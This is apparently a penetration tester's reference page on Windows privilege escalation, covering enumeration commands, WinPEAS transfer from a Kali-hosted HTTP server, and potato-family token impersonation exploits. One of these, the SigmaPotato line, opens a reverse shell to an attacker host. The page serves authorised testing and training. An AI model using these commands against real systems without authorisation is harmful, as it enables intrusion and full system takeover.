---
title: Windows privilege escalation
order: 1
tags: [windows, privesc, privileges, services, winpeas, acl]
---

## Situational awareness

```cmd
systeminfo
```

Record OS/build, architecture and host/domain context. [Microsoft systeminfo](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/systeminfo).

## Token privileges

```cmd
whoami /all
```

Record current identity, groups and token privileges. A listed privilege alone does not prove an available escalation. [Microsoft whoami](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/whoami).

## Impersonation escalation

When `whoami /priv` shows `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` enabled, the potato family usually escalates. Upload the chosen binary with an Evil-WinRM session, then run it on the target:

```powershell
.\PrintSpoofer64.exe -i -c powershell.exe
.\GodPotato.exe -cmd "cmd.exe"
.\SigmaPotato.exe --revshell {{LHOST}} {{LPORT}}
```

Match the binary to the target architecture and build; one failure does not rule out the others. Verify the result reports `nt authority\system`. [PrintSpoofer](https://github.com/itm4n/PrintSpoofer), [GodPotato](https://github.com/BeichenDream/GodPotato), [SigmaPotato](https://github.com/tylerdotrar/SigmaPotato).

## Automated enumeration

- [ ] Choose the x64 binary only for an x64 target with a compatible .NET runtime.
- [ ] Host on Kali and download from target PowerShell using the commands below.
- [ ] [Verify the transferred file](shells/file-transfers#verify-a-transferred-file), then review its findings.
- [ ] Confirm permissions on each proposed path manually.

The C# build requires .NET 4.5.2 or newer. [WinPEAS requirements](https://github.com/peass-ng/PEASS-ng/blob/master/winPEAS/winPEASexe/README.md).

### Host WinPEAS on Kali

Run on Kali. Set LPORT to a free HTTP server port, such as 8000. Keep the server running.

```bash
cd /usr/share/peass/winpeas/
python3 -m http.server {{LPORT}}
```

TODO: verify the local package path if that directory or winPEASx64.exe is missing.

### Download WinPEAS in PowerShell

Run in the target's PowerShell session, in a writable directory. LHOST is Kali's IP reachable from the target's subnet.

```powershell
iwr -UseBasicParsing -Uri 'http://{{LHOST}}:{{LPORT}}/winPEASx64.exe' -OutFile '.\winPEASx64.exe'
```

This uses HTTP for the file transfer, including from an existing Evil-WinRM shell. [PowerShell download options](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-5.1).

### Run WinPEAS

After verifying the downloaded file, run on the target:

```powershell
.\winPEASx64.exe
```

## Service paths and accounts

Run locally in Windows PowerShell:

```powershell
Get-CimInstance -ClassName Win32_Service | Select-Object Name,StartName,PathName,State
```

Check the service account, executable path, arguments and ability to trigger execution. [CIM query](https://learn.microsoft.com/en-us/powershell/module/cimcmdlets/get-ciminstance?view=powershell-7.5), [service properties](https://learn.microsoft.com/en-us/windows/win32/cimwin32prov/win32-service).

## File and directory ACLs

Replace .\tool.exe with the discovered task/service executable, then check its containing directory too.

```cmd
icacls ".\tool.exe"
```

A writable file matters only if a more privileged context uses it. An unquoted service path also needs a viable writable search location and execution trigger. [icacls](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/icacls), [unquoted path conditions](https://attack.mitre.org/techniques/T1574/009/).

## Scheduled tasks

```cmd
schtasks /query /fo LIST /v
```

Record task identity, action and trigger; check the action's file and directory ACLs. [Microsoft query options](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-query).
